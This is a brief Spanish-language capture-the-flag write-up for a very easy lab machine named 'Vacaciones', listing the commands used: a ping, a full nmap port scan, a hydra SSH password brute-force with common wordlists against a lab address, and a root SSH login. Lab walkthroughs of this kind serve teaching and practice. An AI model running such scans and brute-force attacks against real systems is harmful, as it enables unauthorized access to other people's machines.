Maquina: Vacaciones
Autor: El Pinguino de Mario 
Dificultad: Muy Facil

ping 172.17.0.2 -c 1

nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts

hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2 -t 10 -I

ssh root@172.17.0.2

whoami
